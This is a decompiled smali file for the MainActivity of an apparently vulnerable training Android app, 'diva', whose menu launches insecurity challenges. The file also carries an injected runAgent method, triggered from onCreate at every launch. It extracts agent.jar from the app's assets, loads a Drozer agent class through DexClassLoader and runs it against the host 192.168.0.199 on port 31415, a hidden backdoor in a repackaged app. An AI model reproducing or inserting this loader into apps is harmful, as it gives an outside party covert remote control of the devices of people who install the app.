.class public Ljakhar/aseem/diva/MainActivity;
.super Landroid/support/v7/app/AppCompatActivity;
.source "MainActivity.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 13
    invoke-direct {p0}, Landroid/support/v7/app/AppCompatActivity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 17
    invoke-super {p0, p1}, Landroid/support/v7/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 18
    const v1, 0x7f040028

    invoke-virtual {p0, v1}, Ljakhar/aseem/diva/MainActivity;->setContentView(I)V

    .line 19
    const v1, 0x7f0c0097

    invoke-virtual {p0, v1}, Ljakhar/aseem/diva/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/support/v7/widget/Toolbar;

    .line 20
    .local v0, "toolbar":Landroid/support/v7/widget/Toolbar;
    invoke-virtual {p0, v0}, Ljakhar/aseem/diva/MainActivity;->setSupportActionBar(Landroid/support/v7/widget/Toolbar;)V

    .line 27
    invoke-direct {p0}, Ljakhar/aseem/diva/MainActivity;->runAgent()V

    .line 22
    return-void
.end method

.method public onCreateOptionsMenu(Landroid/view/Menu;)Z
    .locals 2
    .param p1, "menu"    # Landroid/view/Menu;

    .prologue
    .line 27
    invoke-virtual {p0}, Ljakhar/aseem/diva/MainActivity;->getMenuInflater()Landroid/view/MenuInflater;

    move-result-object v0

    const/high16 v1, 0x7f0d0000

    invoke-virtual {v0, v1, p1}, Landroid/view/MenuInflater;->inflate(ILandroid/view/Menu;)V

    .line 28
    const/4 v0, 0x1

    return v0
.end method

.method public onOptionsItemSelected(Landroid/view/MenuItem;)Z
    .locals 2
    .param p1, "item"    # Landroid/view/MenuItem;

    .prologue
    .line 36
    invoke-interface {p1}, Landroid/view/MenuItem;->getItemId()I

    move-result v0

    .line 39
    .local v0, "id":I
    const v1, 0x7f0c00c2

    if-ne v0, v1, :cond_0

    .line 40
    const/4 v1, 0x1

    .line 43
    :goto_0
    return v1

    :cond_0
    invoke-super {p0, p1}, Landroid/support/v7/app/AppCompatActivity;->onOptionsItemSelected(Landroid/view/MenuItem;)Z

    move-result v1

    goto :goto_0
.end method

.method public startChallenge(Landroid/view/View;)V
    .locals 2
    .param p1, "view"    # Landroid/view/View;

    .prologue
    .line 48
    const v1, 0x7f0c009f

    invoke-virtual {p0, v1}, Ljakhar/aseem/diva/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    if-ne p1, v1, :cond_1

    .line 49
    new-instance v0, Landroid/content/Intent;

    const-class v1, Ljakhar/aseem/diva/LogActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 50
    .local v0, "i":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Ljakhar/aseem/diva/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 100
    .end local v0    # "i":Landroid/content/Intent;
    :cond_0
    :goto_0
    return-void

    .line 52
    :cond_1
    const v1, 0x7f0c00a0

    invoke-virtual {p0, v1}, Ljakhar/aseem/diva/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    if-ne p1, v1, :cond_2

    .line 53
    new-instance v0, Landroid/content/Intent;

    const-class v1, Ljakhar/aseem/diva/HardcodeActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 54
    .restart local v0    # "i":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Ljakhar/aseem/diva/MainActivity;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 56
    .end local v0    # "i":Landroid/content/Intent;
    :cond_2
    const v1, 0x7f0c00a1

    invoke-virtual {p0, v1}, Ljakhar/aseem/diva/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    if-ne p1, v1, :cond_3

    .line 57
    new-instance v0, Landroid/content/Intent;

    const-class v1, Ljakhar/aseem/diva/InsecureDataStorage1Activity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 58
    .restart local v0    # "i":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Ljakhar/aseem/diva/MainActivity;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 60
    .end local v0    # "i":Landroid/content/Intent;
    :cond_3
    const v1, 0x7f0c00a2

    invoke-virtual {p0, v1}, Ljakhar/aseem/diva/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    if-ne p1, v1, :cond_4

    .line 61
    new-instance v0, Landroid/content/Intent;

    const-class v1, Ljakhar/aseem/diva/InsecureDataStorage2Activity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 62
    .restart local v0    # "i":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Ljakhar/aseem/diva/MainActivity;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 64
    .end local v0    # "i":Landroid/content/Intent;
    :cond_4
    const v1, 0x7f0c00a3

    invoke-virtual {p0, v1}, Ljakhar/aseem/diva/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    if-ne p1, v1, :cond_5

    .line 65
    new-instance v0, Landroid/content/Intent;

    const-class v1, Ljakhar/aseem/diva/InsecureDataStorage3Activity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 66
    .restart local v0    # "i":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Ljakhar/aseem/diva/MainActivity;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 68
    .end local v0    # "i":Landroid/content/Intent;
    :cond_5
    const v1, 0x7f0c00a4

    invoke-virtual {p0, v1}, Ljakhar/aseem/diva/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    if-ne p1, v1, :cond_6

    .line 69
    new-instance v0, Landroid/content/Intent;

    const-class v1, Ljakhar/aseem/diva/InsecureDataStorage4Activity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 70
    .restart local v0    # "i":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Ljakhar/aseem/diva/MainActivity;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 72
    .end local v0    # "i":Landroid/content/Intent;
    :cond_6
    const v1, 0x7f0c00a5

    invoke-virtual {p0, v1}, Ljakhar/aseem/diva/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    if-ne p1, v1, :cond_7

    .line 73
    new-instance v0, Landroid/content/Intent;

    const-class v1, Ljakhar/aseem/diva/SQLInjectionActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 74
    .restart local v0    # "i":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Ljakhar/aseem/diva/MainActivity;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 76
    .end local v0    # "i":Landroid/content/Intent;
    :cond_7
    const v1, 0x7f0c00a6

    invoke-virtual {p0, v1}, Ljakhar/aseem/diva/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    if-ne p1, v1, :cond_8

    .line 77
    new-instance v0, Landroid/content/Intent;

    const-class v1, Ljakhar/aseem/diva/InputValidation2URISchemeActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 78
    .restart local v0    # "i":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Ljakhar/aseem/diva/MainActivity;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_0

    .line 80
    .end local v0    # "i":Landroid/content/Intent;
    :cond_8
    const v1, 0x7f0c00a7

    invoke-virtual {p0, v1}, Ljakhar/aseem/diva/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    if-ne p1, v1, :cond_9

    .line 81
    new-instance v0, Landroid/content/Intent;

    const-class v1, Ljakhar/aseem/diva/AccessControl1Activity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 82
    .restart local v0    # "i":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Ljakhar/aseem/diva/MainActivity;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_0

    .line 84
    .end local v0    # "i":Landroid/content/Intent;
    :cond_9
    const v1, 0x7f0c00a8

    invoke-virtual {p0, v1}, Ljakhar/aseem/diva/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    if-ne p1, v1, :cond_a

    .line 85
    new-instance v0, Landroid/content/Intent;

    const-class v1, Ljakhar/aseem/diva/AccessControl2Activity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 86
    .restart local v0    # "i":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Ljakhar/aseem/diva/MainActivity;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_0

    .line 88
    .end local v0    # "i":Landroid/content/Intent;
    :cond_a
    const v1, 0x7f0c00a9

    invoke-virtual {p0, v1}, Ljakhar/aseem/diva/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    if-ne p1, v1, :cond_b

    .line 89
    new-instance v0, Landroid/content/Intent;

    const-class v1, Ljakhar/aseem/diva/AccessControl3Activity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 90
    .restart local v0    # "i":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Ljakhar/aseem/diva/MainActivity;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_0

    .line 92
    .end local v0    # "i":Landroid/content/Intent;
    :cond_b
    const v1, 0x7f0c00aa

    invoke-virtual {p0, v1}, Ljakhar/aseem/diva/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    if-ne p1, v1, :cond_c

    .line 93
    new-instance v0, Landroid/content/Intent;

    const-class v1, Ljakhar/aseem/diva/Hardcode2Activity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 94
    .restart local v0    # "i":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Ljakhar/aseem/diva/MainActivity;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_0

    .line 96
    .end local v0    # "i":Landroid/content/Intent;
    :cond_c
    const v1, 0x7f0c00ab

    invoke-virtual {p0, v1}, Ljakhar/aseem/diva/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    if-ne p1, v1, :cond_0

    .line 97
    new-instance v0, Landroid/content/Intent;

    const-class v1, Ljakhar/aseem/diva/InputValidation3Activity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 98
    .restart local v0    # "i":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Ljakhar/aseem/diva/MainActivity;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_0
.end method

.method private runAgent()V
    .locals 15

    .prologue
    .line 31
    new-instance v2, Ljava/io/File;

    invoke-virtual {p0}, Ljakhar/aseem/diva/MainActivity;->getFilesDir()Ljava/io/File;

    move-result-object v11

    const-string/jumbo v12, "agent.jar"

    invoke-direct {v2, v11, v12}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 32
    .local v2, "agentJar":Ljava/io/File;
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v11

    if-nez v11, :cond_0

    .line 33
    const/4 v8, 0x0

    .line 34
    .local v8, "is":Ljava/io/InputStream;
    const/4 v6, 0x0

    .line 36
    .local v6, "fos":Ljava/io/FileOutputStream;
    :try_start_0
    invoke-virtual {p0}, Ljakhar/aseem/diva/MainActivity;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v11

    const-string/jumbo v12, "agent.jar"

    invoke-virtual {v11, v12}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v8

    .line 37
    invoke-virtual {v8}, Ljava/io/InputStream;->available()I

    move-result v11

    new-array v9, v11, [B

    .line 38
    .local v9, "jarContent":[B
    invoke-virtual {v8, v9}, Ljava/io/InputStream;->read([B)I

    .line 39
    new-instance v7, Ljava/io/FileOutputStream;

    invoke-direct {v7, v2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 40
    .end local v6    # "fos":Ljava/io/FileOutputStream;
    .local v7, "fos":Ljava/io/FileOutputStream;
    :try_start_1
    invoke-virtual {v7, v9}, Ljava/io/FileOutputStream;->write([B)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_4

    .line 52
    .end local v7    # "fos":Ljava/io/FileOutputStream;
    .end local v8    # "is":Ljava/io/InputStream;
    .end local v9    # "jarContent":[B
    :cond_0
    :goto_0
    :try_start_2
    new-instance v4, Ldalvik/system/DexClassLoader;

    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {p0}, Ljakhar/aseem/diva/MainActivity;->getCacheDir()Ljava/io/File;

    move-result-object v12

    invoke-virtual {v12}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v12

    const/4 v13, 0x0

    invoke-static {}, Ljava/lang/ClassLoader;->getSystemClassLoader()Ljava/lang/ClassLoader;

    move-result-object v14

    invoke-direct {v4, v11, v12, v13, v14}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V

    .line 53
    .local v4, "dexClassLoader":Ldalvik/system/DexClassLoader;
    const-string/jumbo v11, "com.mwr.dz.Agent"

    invoke-virtual {v4, v11}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    .line 54
    .local v0, "aClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    const/4 v11, 0x3

    new-array v11, v11, [Ljava/lang/Class;

    const/4 v12, 0x0

    const-class v13, Ljava/lang/String;

    aput-object v13, v11, v12

    const/4 v12, 0x1

    sget-object v13, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v13, v11, v12

    const/4 v12, 0x2

    const-class v13, Landroid/content/Context;

    aput-object v13, v11, v12

    invoke-virtual {v0, v11}, Ljava/lang/Class;->getConstructor([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;

    move-result-object v3

    .line 55
    .local v3, "constructor":Ljava/lang/reflect/Constructor;, "Ljava/lang/reflect/Constructor<*>;"
    const/4 v11, 0x3

    new-array v11, v11, [Ljava/lang/Object;

    const/4 v12, 0x0

    const-string/jumbo v13, "192.168.0.199"

    aput-object v13, v11, v12

    const/4 v12, 0x1

    const/16 v13, 0x7ab7

    invoke-static {v13}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v13

    aput-object v13, v11, v12

    const/4 v12, 0x2

    aput-object p0, v11, v12

    invoke-virtual {v3, v11}, Ljava/lang/reflect/Constructor;->newInstance([Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    .line 56
    .local v1, "agent":Ljava/lang/Object;
    const-string/jumbo v11, "run"

    const/4 v12, 0x0

    new-array v12, v12, [Ljava/lang/Class;

    invoke-virtual {v0, v11, v12}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v10

    .line 57
    .local v10, "run":Ljava/lang/reflect/Method;
    const/4 v11, 0x0

    new-array v11, v11, [Ljava/lang/Object;

    invoke-virtual {v10, v1, v11}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    .line 59
    .end local v0    # "aClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    .end local v1    # "agent":Ljava/lang/Object;
    .end local v3    # "constructor":Ljava/lang/reflect/Constructor;, "Ljava/lang/reflect/Constructor<*>;"
    .end local v4    # "dexClassLoader":Ldalvik/system/DexClassLoader;
    .end local v10    # "run":Ljava/lang/reflect/Method;
    :goto_1
    return-void

    .line 41
    .restart local v6    # "fos":Ljava/io/FileOutputStream;
    .restart local v8    # "is":Ljava/io/InputStream;
    :catch_0
    move-exception v5

    .line 42
    .local v5, "e":Ljava/lang/Exception;
    :goto_2
    if-eqz v8, :cond_1

    .line 43
    :try_start_3
    invoke-virtual {v8}, Ljava/io/InputStream;->close()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    .line 45
    :cond_1
    :goto_3
    if-eqz v6, :cond_0

    .line 46
    :try_start_4
    invoke-virtual {v6}, Ljava/io/FileOutputStream;->close()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_0

    .line 47
    :catch_1
    move-exception v11

    goto :goto_0

    .line 44
    :catch_2
    move-exception v11

    goto :goto_3

    .line 58
    .end local v5    # "e":Ljava/lang/Exception;
    .end local v6    # "fos":Ljava/io/FileOutputStream;
    .end local v8    # "is":Ljava/io/InputStream;
    :catch_3
    move-exception v11

    goto :goto_1

    .line 41
    .restart local v7    # "fos":Ljava/io/FileOutputStream;
    .restart local v8    # "is":Ljava/io/InputStream;
    .restart local v9    # "jarContent":[B
    :catch_4
    move-exception v5

    move-object v6, v7

    .end local v7    # "fos":Ljava/io/FileOutputStream;
    .restart local v6    # "fos":Ljava/io/FileOutputStream;
    goto :goto_2
.end method